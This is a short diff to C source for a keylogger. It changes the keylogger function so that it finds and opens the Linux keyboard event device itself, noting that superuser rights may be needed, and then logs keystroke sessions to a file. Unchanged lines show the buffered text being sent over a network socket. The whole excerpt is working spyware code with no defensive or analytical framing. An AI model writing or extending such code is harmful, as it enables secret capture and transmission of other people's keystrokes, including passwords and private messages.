@@ -159,7 +159,7 @@ void setSessionEndLog() {
         send(s , string_buffer , strlen(string_buffer) , 0);
     }
 
-    void keylogger(int keyboard, FILE* writeout) {
+    void keylogger(FILE* writeout) {
         signal(SIGINT, quitHandler);
         signal(SIGTERM, quitHandler);
 
@@ -307,9 +307,22 @@ void setSessionEndLog() {
         sprintf(string_buffer,"\r\nUNRECOGNIZED: %d", keyCode); return;
     }
 
-    void keylogger(int keyboard, FILE* writeout) {
+    void keylogger(FILE* writeout) {
         signal(SIGINT, quitHandler);
         signal(SIGTERM, quitHandler);
+
+        int keyboard = 0;
+        char *KEYBOARD_DEVICE = get_keyboard_event_file();
+
+        if(!KEYBOARD_DEVICE){
+            printf("Error accessing keyboard, no keyboard file has been found");
+            return;
+        }
+
+        if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
+            printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
+            return;
+        }
 
         setSessionStartLog();
         fprintf(writeout, "%s", string_buffer);
